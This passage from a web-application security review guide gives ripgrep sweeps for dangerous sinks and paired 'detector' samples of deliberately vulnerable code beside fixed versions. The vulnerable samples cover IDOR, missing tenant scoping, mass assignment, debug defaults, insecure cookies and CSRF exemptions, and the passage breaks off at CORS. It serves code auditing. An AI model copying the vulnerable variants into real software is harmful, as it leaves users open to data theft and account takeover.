rg -n --hidden "child_process\.(exec|execSync)\(|shell=True|Runtime\.getRuntime\(\)\.exec\(|os\.system\(|eval\(|new Function\(" .

# deserialization and XML
rg -n --hidden "pickle\.loads?\(|yaml\.load\(|readObject\(|BinaryFormatter|Marshal\.load|unserialize\(|JsonConvert\.DeserializeObject<object>" .
rg -n --hidden "etree\.fromstring|DocumentBuilderFactory|XmlReaderSettings|SAXParserFactory|libxml_disable_entity_loader" .

# outbound requests whose destination may be caller-influenced
rg -n --hidden "fetch\(|axios\.(get|post)\(|requests\.(get|post)\(|httpx\.|http\.Get\(|HttpClient|urlopen\(" .

# cookies, CORS, redirects
rg -n --hidden "res\.cookie\(|set_cookie\(|Set-Cookie|SameSite|Access-Control-Allow-Origin|cors\(|res\.redirect\(|HttpResponseRedirect\(|sendRedirect\(" .

# secrets the browser will receive
rg -n --hidden --glob '**/src/**' --glob '**/app/**' --glob '**/pages/**' --glob '**/components/**' "NEXT_PUBLIC_|VITE_|REACT_APP_|process\.env\." .
```

**Five sweeps are inverted, because the dangerous shape is the absence of a literal.** A detector keyed to the opted-in string reads every un-opted-in file as clean, which is the silent all-clear this lens exists to prevent.

```bash
# HTML-serving apps with no CSP anywhere
rg --files-without-match --hidden --glob '**/*.ts' --glob '**/*.js' --glob '**/*.py' --glob '**/*.rb' --glob '**/*.go' --glob '**/*.java' --glob '**/*.cs' 'Content-Security-Policy|helmet\(|SecurityHeadersPolicy' .

# session cookies set with no attribute block — the explicit-call case only
rg -n --hidden "res\.cookie\(|set_cookie\(" . | rg -vi "httponly|secure|samesite"
# -vi, not -v with a hand-listed camelCase set: Flask and Django write `httponly=True`, which
# the earlier token list did not contain in that casing. LINE-ORIENTED — the filter drops the
# matched line only, so a call whose flags sit on continuation lines is still printed. Measured:
# three `requests.post(` calls and one `set_cookie(` were false-flagged this way. Open every
# hit and read the whole call before filing.

# and the case the line above cannot see: a framework-managed session cookie,
# where the attribute is a settings key and the defect is the key's ABSENCE.
# First locate the sites, then check each one for the keys.
rg -n --hidden "SESSION_COOKIE_SECURE|CSRF_COOKIE_SECURE|SESSION_COOKIE_SAMESITE|SESSION_COOKIE_HTTPONLY" .
rg -n --hidden "session\(\{|express-session|session_store|Cookie\.SecurePolicy|AddSession\(|CookieAuthenticationOptions" .
rg -l --hidden --glob '**/settings*.py' --glob '**/config/environments/*.rb' --glob '**/appsettings*.json' '' . \
  | xargs -r rg --files-without-match 'SESSION_COOKIE_SECURE|CSRF_COOKIE_SECURE|force_ssl|SecurePolicy'

# CDN script tags with no integrity attribute
rg -n --hidden '<script[^>]*src="https?://' --glob '**/*.html' --glob '**/*.ejs' --glob '**/*.erb' --glob '**/*.hbs' --glob '**/*.vue' --glob '**/*.svelte' --glob '**/*.jsx' --glob '**/*.tsx' . | rg -v 'integrity='

# webhook routes with no verification call anywhere in the file
rg --files-with-matches --hidden -g '**/*webhook*' '' . | xargs -r rg --files-without-match 'constructEvent|verifyHeader|timingSafeEqual|compare_digest|hmac'

# outbound HTTP with no timeout argument (Python and Go default to none)
rg -n --hidden "requests\.(get|post|put|delete)\(" . | rg -v "timeout="
# LINE-ORIENTED. A call written across several lines with `timeout=5` below the opening paren
# is printed here as though it had none — measured on three calls. This sweep surfaces
# candidates; confirm the absence by reading the call, not from this output.
```

The last sweep is worth its own sentence: `requests` has **no** default timeout, and a bare `http.Client{}` in Go has none either. A handler that makes an outbound call with no timeout converts a slow dependency into an exhausted worker pool, which is why it appears here and not only under resilience.

The detector below demonstrates the inverted direction, and it is the one worth internalizing: the vulnerable side contains **no literal to search for**. It is found only by asking which files that render HTML contain none of the strings that would set a header.

```detector
match: |
  // src/server.ts — renders HTML and sets no security header anywhere in the tree
  const app = express()
  app.set('view engine', 'ejs')
  app.use(express.static('public'))
  app.get('/', requireAuth, (req, res) => res.render('index', { user: req.user }))
nomatch: |
  // src/server.ts
  const app = express()
  app.set('view engine', 'ejs')
  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          objectSrc: ["'none'"],
          baseUri: ["'none'"],
          frameAncestors: ["'none'"],
        },
      },
    }),
  )
  app.use(express.static('public'))
  app.get('/', requireAuth, (req, res) => res.render('index', { user: req.user }))
```

### 1. Object-level authorization, BOLA/IDOR (`authz-object-level`)

`API1:2023`, and the single highest-yield finding class in this domain. For every handler that accepts an identifier, ask the second question: not "is this caller authenticated" but "may *this* caller reach *this* object". The authentication middleware answers the first and nothing answers the second.

Work it this way:

- Enumerate every route that takes an identifier in a path segment, a query parameter, a body field, a header, or a JSON-API `filter[...]`.
- For each, follow the query chain to where the object is loaded and find the predicate that scopes it to the caller. Name the line. "There is probably a scope" is not a finding decision either way.
- **Check the write, bulk and export paths separately from the read path.** Ownership scoping is very often present on `GET /orders/:id` and absent on `PATCH /orders/:id`, on `POST /orders/bulk`, and on the CSV export that reuses a different query builder.
- Check the second-order objects: a comment on a document, an attachment on a ticket, a line item on an invoice. The parent is scoped, the child lookup takes a raw child identifier and never re-checks the parent.
- A UUID is not an authorization control. It raises the cost of enumeration and does nothing once the identifier leaks — through a shared link, a `Referer`, a support ticket, a log, or a sibling API that returns it.

```detector
match: |
  // src/routes/orders.ts
  router.get('/api/orders/:id', requireAuth, async (req, res) => {
    const order = await Order.findByPk(req.params.id, { include: [LineItem] })
    if (!order) return res.status(404).json({ error: 'not found' })
    res.json(order)
  })
nomatch: |
  // src/routes/orders.ts
  router.get('/api/orders/:id', requireAuth, async (req, res) => {
    const order = await Order.findOne({
      where: { id: req.params.id, customerId: req.user.customerId },
      include: [LineItem],
    })
    if (!order) return res.status(404).json({ error: 'not found' })
    res.json(order)
  })
```

The mutation path is a separate detector because it is a separate defect, and it is the one that survives a review of the read path.

```detector
match: |
  # api/views.py
  class InvoiceViewSet(viewsets.ModelViewSet):
      serializer_class = InvoiceSerializer
      permission_classes = [IsAuthenticated]

      def get_queryset(self):
          return Invoice.objects.filter(account=self.request.user.account)

      @action(detail=True, methods=["post"])
      def resend(self, request, pk=None):
          invoice = Invoice.objects.get(pk=pk)
          invoice.send()
          return Response({"status": "sent"})
nomatch: |
  # api/views.py
  class InvoiceViewSet(viewsets.ModelViewSet):
      serializer_class = InvoiceSerializer
      permission_classes = [IsAuthenticated]

      def get_queryset(self):
          return Invoice.objects.filter(account=self.request.user.account)

      @action(detail=True, methods=["post"])
      def resend(self, request, pk=None):
          invoice = self.get_object()
          invoice.send()
          return Response({"status": "sent"})
```

That pair is worth reading twice: the class has a correct `get_queryset`, a reviewer sees it, and the custom action bypasses it by calling the manager directly. `self.get_object()` is what applies the scope.

### 2. Tenant isolation (`tenant-isolation-enforcement`)

Multi-tenant scoping fails in three shapes, and only the first is what people look for.

- **The predicate is missing on one query.** With scoping applied per query rather than at a layer that cannot be forgotten, one forgotten `WHERE tenant_id = ?` is a full cross-tenant read. Prefer a mechanism that fails closed: Postgres row-level security driven by a per-transaction setting — written either as `SET LOCAL app.tenant_id = …` or, portably across database drivers, as `SELECT set_config('app.tenant_id', …, true)` — an ORM global scope or base repository, a per-tenant schema or connection. Search for **both** spellings; a codebase that uses `set_config` and is only grepped for `SET LOCAL` reads as having no RLS at all.
- **The tenant is taken from the request.** A `tenant_id` in the body, an `X-Tenant-ID` header, or a subdomain the caller controls, used without checking it against the session's tenant, is authorization by request parameter.
- **"No tenant" resolves to "all tenants".** A nullable tenant column, a missing header defaulting to none, or a session variable that was never set, combined with a query that omits the predicate when the value is empty, returns everything.

Also check that the tenant context is re-established on every borrowed connection: a `SET` executed once at pool creation leaks the previous request's tenant into the next.

```detector
match: |
  # app/repositories/report.py
  def rows_for_report(conn, report_id, tenant_id=None):
      sql = "SELECT * FROM report_rows WHERE report_id = %s"
      params = [report_id]
      if tenant_id:
          sql += " AND tenant_id = %s"
          params.append(tenant_id)
      with conn.cursor() as cur:
          cur.execute(sql, params)
          return cur.fetchall()
nomatch: |
  # app/repositories/report.py
  def rows_for_report(conn, report_id, tenant_id):
      if not tenant_id:
          raise PermissionError("no tenant in request context")
      with conn.cursor() as cur:
          # set_config, not "SET LOCAL ... = %s": SET is a utility statement and
          # cannot take a bound parameter, so the SET form works only on drivers
          # that interpolate client-side (psycopg2) and fails on psycopg3 and
          # asyncpg. set_config is a function call and is portable across all
          # three. The third argument is is_local -- transaction-scoped.
          cur.execute("SELECT set_config('app.tenant_id', %s, true)", [tenant_id])
          cur.execute(
              "SELECT * FROM report_rows WHERE report_id = %s AND tenant_id = %s",
              [report_id, tenant_id],
          )
          return cur.fetchall()
```

```detector
match: |
  // src/middleware/tenant.ts
  export function tenantContext(req, res, next) {
    req.tenantId = req.header('X-Tenant-ID') ?? req.body?.tenantId
    next()
  }
nomatch: |
  // src/middleware/tenant.ts
  export function tenantContext(req, res, next) {
    const claimed = req.header('X-Tenant-ID')
    if (claimed && claimed !== req.user.tenantId) {
      return res.status(403).json({ error: 'tenant mismatch' })
    }
    req.tenantId = req.user.tenantId
    next()
  }
```

### 3. Function-level authorization (`authz-function-level`)

`API5:2023`. Every operation is graded against the role that is *supposed* to reach it, and three shapes recur.

- **A route registered above the guard.** Middleware order is positional in Express, Koa, Hono and Chi. A router mounted before `app.use(requireAuth)` is unauthenticated regardless of what the handler assumes. Read the mounting order in the server entry point, not the route file.
- **A public-path list that prefix-matches.** A `PUBLIC_PATHS` entry of `/public` also matches `/publications/secret`; `/health` also matches `/healthcheck-admin`. Anchored patterns only, and a self-test that proves the near-miss is not matched.
- **Authorization on the controller but not on the service, the queue consumer, the scheduled job or the gRPC method that reaches the same operation.** Enumerate operations, not routes.

- **A check on `Referer` or `Origin` as the *only* access control.** Both are caller-supplied: `Referer` is absent under `Referrer-Policy: no-referrer`, stripped by privacy tooling and by some proxies, and freely set by a non-browser client. Code that admits a request when the header is missing — the common implementation, because stripping is common — is unauthenticated. `Origin` is trustworthy for the narrow question of *which browser origin issued a cross-origin request* and for nothing else.

Also: `@PreAuthorize` and `[Authorize]` only apply where the framework proxies the call — a self-invocation inside the same Spring bean bypasses the annotation entirely, and an `[Authorize]` on an action of a controller whose base has `[AllowAnonymous]` behaves differently than a reviewer expects. Say which mechanism you traced.

```detector
match: |
  // src/server.ts
  import adminRouter from './routes/admin'
  import apiRouter from './routes/api'

  app.use('/admin', adminRouter)
  app.use(requireAuth)
  app.use('/api', apiRouter)
nomatch: |
  // src/server.ts
  import adminRouter from './routes/admin'
  import apiRouter from './routes/api'

  app.use(requireAuth)
  app.use('/admin', requireRole('admin'), adminRouter)
  app.use('/api', apiRouter)
```

```detector
match: |
  # app/middleware/auth.py
  PUBLIC_PREFIXES = ("/public", "/health", "/static")

  def is_public(path: str) -> bool:
      return path.startswith(PUBLIC_PREFIXES)
nomatch: |
  # app/middleware/auth.py
  import re

  PUBLIC_PATTERNS = [
      re.compile(r"^/public/[^/]+$"),
      re.compile(r"^/health$"),
      re.compile(r"^/static/.+$"),
  ]

  def is_public(path: str) -> bool:
      return any(p.fullmatch(path) for p in PUBLIC_PATTERNS)

  # self-test: a near miss must not be public
  assert not is_public("/publications/secret")
  assert not is_public("/healthcheck-admin")
```

### 4. Debug, admin and metadata endpoints (`debug-and-admin-endpoint-exposure`)

`A02:2025`, `API8:2023`. These are findable from concrete artifacts; name the artifact, not the concept.

- **Spring Boot Actuator.** `management.endpoints.web.exposure.include=*` in `application.properties` / `application.yml`. The endpoints that matter are `/actuator/env`, `/actuator/heapdump`, `/actuator/threaddump`, `/actuator/configprops`, `/actuator/loggers` and `/actuator/mappings` — `heapdump` alone hands over every secret the process holds. `/actuator/health` is usually fine; grade the specific endpoint.
- **Framework debug modes.** `DEBUG = True` in Django settings (the error page renders settings and the SQL), `app.run(debug=True)` in Flask (the Werkzeug debugger is a remote shell when the PIN is disabled or derivable), `APP_DEBUG=true` in Laravel, `<customErrors mode="Off">` and `ASPNETCORE_ENVIRONMENT=Development` in .NET, `NODE_ENV` unset in Express (the default error handler prints the stack).
- **API documentation and schema surfaces.** The real paths are `/swagger-ui.html`, `/swagger-ui/index.html`, `/v3/api-docs`, `/openapi.json`, `/docs`, `/redoc` and `/graphql` with introspection. **A grep for `/api/swagger` finds nothing in any framework's default** — it is not a path any of them serves, and a check keyed to it reports clean on every codebase.
- **Directory listing.** `autoindex on;` in nginx, `Options +Indexes` in Apache, `serve-index` middleware in Express, `http.server` or `python -m http.server` in a compose file, `FileServer` over a directory in Go.
- **Admin panels mounted in the app**: Django admin at a default path with no IP or SSO restriction, `flask-admin`, `rails/db`, `/rails/info/routes`, Bull Board, Prisma Studio, an in-app SQL console.

```detector
match: |
  # src/main/resources/application.properties
  management.endpoints.web.exposure.include=*
  management.endpoint.health.show-details=always
  spring.h2.console.enabled=true
nomatch: |
  # src/main/resources/application.properties
  management.endpoints.web.exposure.include=health,info
  management.endpoint.health.show-details=when-authorized
  management.server.port=9001
  management.server.address=127.0.0.1
```

```detector
match: |
  # config/settings/production.py
  DEBUG = os.environ.get("DJANGO_DEBUG", "True") == "True"
  ALLOWED_HOSTS = ["*"]
nomatch: |
  # config/settings/production.py
  DEBUG = False
  ALLOWED_HOSTS = [h for h in os.environ["DJANGO_ALLOWED_HOSTS"].split(",") if h]
```

The default in that pair is the whole finding: the flag reads from the environment, and the *fallback* is `True`. An environment that forgets to set the variable ships the debug error page. Grep the default, not the variable.

### 5. Mass assignment and parameter binding (`mass-assignment-and-parameter-binding`)

`API3:2023`, input side. A caller-supplied payload sets a field the caller was not entitled to set: `role`, `is_admin`, `tenant_id`, `owner_id`, `email_verified`, `balance`, `price`, `status`, `plan`, `credits`, `created_at`. **This slug is also where `salesforce-platform` sends the generic form of the defect**, so the shape must be recognizable independent of framework.

The vulnerable constructions, by stack: `Object.assign(user, req.body)` and `{ ...req.body }` in Node; `Model.update(req.body)` in Sequelize and `updateMany`/`update` with a spread in Prisma; `params.require(:user).permit!` or a `permit` list that grew past its purpose in Rails; `ModelForm` with `fields = "__all__"` or `exclude = []` in Django, and a DRF serializer with `fields = "__all__"`; `@ModelAttribute` binding with no `@InitBinder` `setAllowedFields` in Spring MVC; `TryUpdateModelAsync` and `[Bind]`-less model binding in ASP.NET; `$model->fill($request->all())` with `$guarded = []` in Laravel; `mongoose` `findOneAndUpdate(filter, req.body)` and `$set: req.body`.

Two rules that decide the grade:

- **An allowlist that includes a privileged field is not an allowlist.** Read the list; do not stop at seeing one.
- **The dangerous field does not have to be on the same model.** A nested write — `{ "profile": { "user": { "role": "admin" } } }` against an ORM that cascades — reaches a model nobody reviewed. Prisma nested writes, Sequelize `include` on create, and Rails `accepts_nested_attributes_for` are the three that appear most.

```detector
match: |
  // src/controllers/user.ts
  router.patch('/api/users/me', requireAuth, async (req, res) => {
    const user = await User.findByPk(req.user.id)
    Object.assign(user, req.body)
    await user.save()
    res.json(user)
  })
nomatch: |
  // src/controllers/user.ts
  const EDITABLE = ['displayName', 'locale', 'timezone'] as const

  router.patch('/api/users/me', requireAuth, async (req, res) => {
    const user = await User.findByPk(req.user.id)
    for (const field of EDITABLE) {
      if (field in req.body) user.set(field, req.body[field])
    }
    await user.save()
    res.json(serializeUser(user))
  })
```

```detector
match: |
  # app/controllers/users_controller.rb
  class UsersController < ApplicationController
    def update
      @user = current_user
      @user.update!(params.require(:user).permit!)
      render json: @user
    end
  end
nomatch: |
  # app/controllers/users_controller.rb
  class UsersController < ApplicationController
    def update
      @user = current_user
      @user.update!(user_params)
      render json: UserSerializer.new(@user)
    end

    private

    def user_params
      params.require(:user).permit(:display_name, :locale, :time_zone)
    end
  end
```

### 6. Property-level authorization on the way out (`authz-property-level`)

`API3:2023`, output side. Output filtering matters as much as input filtering, and it fails quietly because the response still looks right in the UI that ignores the extra fields.

- **Whole-model serialization.** `res.json(user)` on an ORM instance, `fields = "__all__"` in a DRF serializer, `JsonConvert.SerializeObject(entity)`, `render json: @user` with no serializer, a GraphQL type generated from the table. The classic payload: `password_hash`, `mfa_secret`, `reset_token`, `stripe_customer_id`, `internal_notes`, `risk_score`, `is_admin`.
- **The same object serialized differently on two routes.** A list endpoint that returns a trimmed shape and a detail endpoint that returns the model, or a search index document that carries fields the API filters out.
- **Field-level rules that exist in one place only.** A GraphQL `@auth` directive applied on the root field and not on the type, so the same field is reachable through a different parent. Enumerate paths to the field, not fields.
- **Error and validation responses that echo the record.** A uniqueness violation that returns the conflicting row is a read primitive.
- Where the field is regulated data, the classification and the uplift come from `hipaa-and-phi` or `privacy-and-data-protection`; the over-return itself is filed here.

```detector
match: |
  # api/serializers.py
  class UserSerializer(serializers.ModelSerializer):
      class Meta:
          model = User
          fields = "__all__"
nomatch: |
  # api/serializers.py
  class UserSerializer(serializers.ModelSerializer):
      class Meta:
          model = User
          fields = ["id", "display_name", "locale", "avatar_url"]
          read_only_fields = ["id"]
```

```detector
match: |
  // src/routes/admin-search.ts
  router.get('/api/search/users', requireAuth, async (req, res) => {
    const rows = await db.query('SELECT * FROM users WHERE email ILIKE $1', [
      `%${req.query.q}%`,
    ])
    res.json(rows)
  })
nomatch: |
  // src/routes/admin-search.ts
  router.get('/api/search/users', requireAuth, requireRole('support'), async (req, res) => {
    const rows = await db.query(
      'SELECT id, display_name, email FROM users WHERE email ILIKE $1 LIMIT 50',
      [`%${req.query.q}%`],
    )
    res.json(rows.map(publicUserShape))
  })
```

### 7. Authentication and credential flows (`authentication-and-credential-flows`)

`A07:2025`, `API2:2023`. Hashing parameters and token entropy are `crypto-and-key-management`'s; what follows is the flow.

- **Account enumeration.** Different status codes, different bodies, different redirect targets, or a materially different response time for "no such user" versus "wrong password". The same applies to registration ("email already in use"), password reset, and any invite flow. A uniform response plus a rate limit is the fix; where the product requires telling the user the address is taken, say so and grade it Info with the reasoning.
- **Password policy.** Length over composition. Composition rules (`(?=.*[A-Z])(?=.*\d)(?=.*[!@#])`), forced periodic rotation, security questions, and truncation or a low maximum length are all defects against NIST SP 800-63B's direction. Check against a breach corpus. **Two specifics worth naming because they are silent:** a maximum length below 64 characters, and a policy that strips or rejects spaces and Unicode — both break passphrases and password managers. *I have not pinned a minimum-length number to a revision of 800-63B here, because the number changed between revisions and citing the wrong one would be quoted back at the client; state the direction, and cite the revision only if you have it open.*
- **Password reset.** The token must be single-use, short-lived, invalidated on use *and* on password change, unguessable, and not reusable after the mail is forwarded. The reset must invalidate existing sessions. A reset link in an email that also renders the token in a page URL puts it in `Referer` and in logs — that half is item 31.
- **MFA.** Rate-limit the verification endpoint (a six-digit code with no limit is a one-million-request exhaustion, and a four-digit one is ten thousand — quote the code length from the generator before you quote a number), reject reused TOTP codes inside the window, treat recovery codes as credentials, and check that enrollment cannot be replaced by an unauthenticated flow. SMS as the only factor on a high-value account is a finding worth stating even though it is a design choice.
- **Login as a state change.** Session fixation, rotation and revocation are item 8.
- **Default and seeded credentials** that survive into a production configuration path. Key material in the repository is `hardcoded-credentials-and-key-material` in crypto; a login form that accepts a documented default is this lens's.

```detector
match: |
  # app/auth/views.py
  @bp.post("/login")
  def login():
      user = User.query.filter_by(email=request.form["email"]).first()
      if not user:
          return jsonify({"error": "No account with that email"}), 404
      if not verify_password(user, request.form["password"]):
          return jsonify({"error": "Incorrect password"}), 401
      return jsonify({"token": issue_session(user)})
nomatch: |
  # app/auth/views.py
  @bp.post("/login")
  @limiter.limit("10/minute;50/hour", key_func=login_rate_key)
  def login():
      user = User.query.filter_by(email=request.form["email"]).first()
      if user is None or not verify_password(user, request.form["password"]):
          # identical body, identical status, and the hash is computed either
          # way so the failure paths do not differ measurably in time
          verify_password_dummy()
          return jsonify({"error": "Invalid email or password"}), 401
      return jsonify({"token": issue_session(user)})
```

```detector
match: |
  // src/auth/password-policy.ts
  export const PASSWORD_RULE =
    /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*])[A-Za-z\d!@#$%^&*]{8,20}$/

  export function validate(pw: string) {
    return PASSWORD_RULE.test(pw)
  }
nomatch: |
  // src/auth/password-policy.ts
  import { pwnedPassword } from 'hibp'

  export async function validate(pw: string) {
    if (pw.length < 12 || pw.length > 256) return 'length'
    if (await pwnedPassword(pw) > 0) return 'breached'
    return null
  }
```

```detector
match: |
  # app/auth/reset.py
  @bp.post("/reset/confirm")
  def confirm_reset():
      token = PasswordResetToken.query.filter_by(token=request.json["token"]).first()
      if token is None or token.expires_at < utcnow():
          abort(400)
      token.user.set_password(request.json["password"])
      db.session.commit()
      return "", 204
nomatch: |
  # app/auth/reset.py
  @bp.post("/reset/confirm")
  def confirm_reset():
      token = PasswordResetToken.query.filter_by(token=request.json["token"]).first()
      if token is None or token.used_at is not None or token.expires_at < utcnow():
          abort(400)
      token.used_at = utcnow()
      token.user.set_password(request.json["password"])
      PasswordResetToken.query.filter_by(user_id=token.user_id, used_at=None).delete()
      Session.query.filter_by(user_id=token.user_id).delete()
      db.session.commit()
      return "", 204
```

### 8. Sessions and cookies (`session-and-cookie-management`)

The security attributes and the identifier lifecycle. Lawfulness and lifetime of a cookie under consent law are `cookie-lawfulness-and-lifetime` in `privacy-and-data-protection`; do not file one as the other.

- `Secure`, `HttpOnly` and `SameSite` on every authentication cookie. `SameSite=Lax` is the browser default in Chromium and blocks classic cross-site form POSTs; `SameSite=None` re-opens them and requires `Secure`. Whether `Lax` or `Strict` is right is a product question — whether the code sets it explicitly is not.
- **Look where the attribute actually lives, which for a framework-managed session cookie is almost never a `res.cookie` or `set_cookie` call.** This is the single most-missed shape in the item, because the dangerous state is a *key that is absent from a settings file* — there is no literal to grep for and the code reads as clean:

  | Stack | Where the attribute is set | The dangerous default |
  |---|---|---|
  | Django | `SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`, `SESSION_COOKIE_HTTPONLY`, `SESSION_COOKIE_SAMESITE`, `CSRF_COOKIE_HTTPONLY` in settings | `SESSION_COOKIE_SECURE` and `CSRF_COOKIE_SECURE` default to `False`, and the key is usually simply not present |
  | Flask | `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_HTTPONLY`, `SESSION_COOKIE_SAMESITE` in `app.config` | `SESSION_COOKIE_SECURE` is `False`, `SESSION_COOKIE_SAMESITE` is unset |
  | Express | `session({ cookie: { secure, httpOnly, sameSite } })` from `express-session` — not `res.cookie` | `cookie.secure` is false and `sameSite` is unset unless the options object says otherwise |
  | Rails | `config.session_store :cookie_store, secure:, httponly:, same_site:` | insecure unless `config.force_ssl = true` or the option is given |
  | ASP.NET Core | `options.Cookie.SecurePolicy`, `options.Cookie.HttpOnly`, `options.Cookie.SameSite` on the cookie-authentication or session options | `SecurePolicy` is `SameAsRequest` unless set to `Always` |

  So the check is *findable by absence*: locate the settings module or the session-middleware construction, and report the key that is not there. Quote the file and the surrounding block you searched, so the finding names an artifact rather than a concept.
- The `__Host-` prefix binds a cookie to the exact origin: it requires `Secure`, no `Domain` attribute, and `Path=/`. Its absence matters most where subdomains are not fully trusted, because a cookie scoped to `.example.com` is writable by any subdomain and that is the delivery mechanism for session fixation and for several CSRF variants.
- **Rotate the session identifier on login, on privilege change and on MFA step-up.** `req.session.regenerate()`, `request.session.cycle_key()`, `reset_session`, `Session.Clear()` plus a new identifier. A framework that reuses the pre-authentication identifier is vulnerable to fixation whenever an attacker can plant one.
- **Logout must invalidate server-side.** Clearing the client cookie is not revocation. For stateless tokens, a short access-token lifetime with refresh-token revocation and rotation is the documented tradeoff — see the false-positive entry — but there must be *something* on the server that can end a session.
- **Check the store, and keep three different defects apart — they are routinely collapsed into one wrong sentence.**
  - *Payload readable by the client.* Flask's default session is the clear case: the contents are base64 and signed, not encrypted, so anything put in the session is disclosed to whoever holds the cookie. Rails `CookieStore` was this before Rails 4; since Rails 4 the cookie jar is **encrypted** under `secret_key_base`, so "the client can read it" is wrong for any supported Rails and should not be written into a report.
  - *Revocation impossible because the state is client-held.* Any client-side store — Flask's default and Rails `CookieStore` alike — cannot be invalidated server-side; the only levers are expiry and rotating the signing/encryption key, which logs everyone out. That half is true of `CookieStore` even though the read half is not.
  - *`express-session` with the default `MemoryStore` is a **server-side** store*, and the cookie carries a signed session **id**, not the payload. Do not file it as session-contents disclosure. Its real defects: state lives in one process, so revocation and the session itself do not survive a restart and are not shared across replicas; it grows without bound; and the library itself documents it as not for production. Grade it as availability and revocation-integrity, not confidentiality.
- Absolute lifetime as well as idle timeout. A session with only a sliding window never ends.

```detector
match: |
  // src/auth/session.ts
  res.cookie('sid', sessionId, { maxAge: 1000 * 60 * 60 * 24 * 30 })
nomatch: |
  // src/auth/session.ts
  res.cookie('__Host-sid', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
    maxAge: 1000 * 60 * 60 * 8,
  })
```

The detector below is the one that matters more often, and its `match` side contains **no defective literal at all** — the finding is the three keys that are not in the file.

```detector
match: |
  # config/settings/production.py — the session cookie is insecure by default
  # and nothing here changes it: no SESSION_COOKIE_SECURE, no CSRF_COOKIE_SECURE,
  # no SESSION_COOKIE_SAMESITE anywhere in the settings tree
  DEBUG = False
  ALLOWED_HOSTS = ["app.example.com"]
  SESSION_ENGINE = "django.contrib.sessions.backends.db"
  SESSION_COOKIE_AGE = 60 * 60 * 8
nomatch: |
  # config/settings/production.py
  DEBUG = False
  ALLOWED_HOSTS = ["app.example.com"]
  SESSION_ENGINE = "django.contrib.sessions.backends.db"
  SESSION_COOKIE_AGE = 60 * 60 * 8
  SESSION_COOKIE_SECURE = True
  SESSION_COOKIE_HTTPONLY = True
  SESSION_COOKIE_SAMESITE = "Lax"
  CSRF_COOKIE_SECURE = True
  SECURE_HSTS_SECONDS = 31536000
```

```detector
match: |
  # app/auth/views.py
  def login_view(request):
      user = authenticate(
          request, username=request.POST["email"], password=request.POST["password"]
      )
      if user is None:
          return HttpResponse(status=401)
      request.session["user_id"] = user.id
      request.session["role"] = user.role
      return redirect("/dashboard")
nomatch: |
  # app/auth/views.py
  from django.contrib.auth import login as django_login

  def login_view(request):
      user = authenticate(
          request, username=request.POST["email"], password=request.POST["password"]
      )
      if user is None:
          return HttpResponse(status=401)
      # django_login() calls request.session.cycle_key(), so a session
      # identifier planted before authentication cannot be reused after it
      django_login(request, user)
      request.session.set_expiry(60 * 60 * 8)
      return redirect("/dashboard")
```

### 9. Cross-site request forgery (`csrf`)

CSRF needs an ambient credential — a cookie, HTTP Basic, a client certificate, an intranet Kerberos ticket — that the browser attaches without the page asking. A `Authorization: Bearer` header a hostile origin cannot set is not one, which is why the false-positive list opens with that case. What to check:

- **State change on a safe method.** A `GET` that mutates is the strongest CSRF delivery path there is, and it survives `SameSite=Lax` — but **get the mechanism right, because this is the sentence that will be quoted in the report.** `Lax` cookies are sent on cross-site **top-level navigations with a safe method**, so the working carriers are `window.location`, `window.open`, a plain link the user clicks, or a `302` from an attacker-controlled page. They are **not** sent on cross-site *subresource* requests, and an `<img>` tag is exactly that — the `<img>` path works only where the cookie is `SameSite=None`, or in a browser that has not shipped Lax-by-default. Enumerate `GET` and `HEAD` handlers that write, and name the carrier you are claiming.
- **Blanket exemptions.** `@csrf_exempt` in Django, `skip_before_action :verify_authenticity_token` in Rails, `.csrf().disable()` in Spring Security, `[IgnoreAntiforgeryToken]` in ASP.NET, `csurf` mounted after the routes it is supposed to protect. Each is sometimes correct — an API consumed only with bearer tokens, a webhook receiver — and each needs the reason stated. Rails' `protect_from_forgery with: :null_session` silently accepts the request with an empty session rather than rejecting it, which is a different behavior from `:exception` and is frequently misread as protection.
- **What actually restores the delivery path the `Lax` default removed: two things, and CORS is not one of them.** A cookie set `SameSite=None` (the browser then attaches it to cross-site subresource requests again), or an attacker-controllable *same-site* subdomain (a request from `evil.example.com` to `app.example.com` is same-site, so `Lax` never applied). One of those must be nameable, alongside the mutating-`GET` case above, before this is graded above Medium.
- **Credentialed CORS reflection is a different bug and must not be listed as a CSRF carrier.** `Access-Control-Allow-Origin` echoing the request origin with `Access-Control-Allow-Credentials: true` does not cause the browser to attach a `SameSite=Lax` cookie it would otherwise withhold — CORS governs whether the *response* may be read, not whether the *credential* is sent. If the cookie is `SameSite=None` the request was already being delivered without any help from CORS. It is a **response-read** vulnerability, graded on its own row, and it chains into CSRF only in one specific way worth writing down precisely: it lets the attacker's origin *read* the anti-CSRF token out of a response, defeating the token — but only on a request the cookie was already going to be attached to. File it as `cors-policy`, and cite it in a CSRF finding as a defeat of the token, never as the delivery.
- Token binding: a CSRF token that is not bound to the session (a static value, or one accepted from a cookie the attacker can set — the "double submit" variant without a signature) is not a control.

```detector
match: |
  # app/controllers/api/transfers_controller.rb
  class Api::TransfersController < ApplicationController
    skip_before_action :verify_authenticity_token
    before_action :authenticate_user!

    def create
      Transfer.create!(from: current_user.account, to: params[:to], cents: params[:cents])
      head :created
    end
  end
nomatch: |
  # app/controllers/api/transfers_controller.rb
  class Api::TransfersController < ApplicationController
    # session cookies are not accepted on this controller; the only credential
    # is a bearer token, which the browser never attaches on its own
    skip_before_action :verify_authenticity_token
    before_action :authenticate_with_bearer_token!

    def create
      Transfer.create!(from: current_token.account, to: params[:to], cents: params[:cents])
      head :created
    end
  end
```

```detector
match: |
  // src/routes/account.ts
  router.get('/account/delete', requireAuth, async (req, res) => {
    await Account.destroy({ where: { id: req.user.accountId } })
    res.redirect('/goodbye')
  })
nomatch: |
  // src/routes/account.ts
  router.post('/account/delete', requireAuth, verifyCsrfToken, async (req, res) => {
    await Account.destroy({ where: { id: req.user.accountId } })
    res.redirect('/goodbye')
  })
```

### 10. CORS (`cors-policy`)

The exploitable shape is reflection, not breadth. A literal `Access-Control-Allow-Origin: *` cannot be combined with credentials — the browser refuses — so on a public route it is correct and intentional. What to look for:

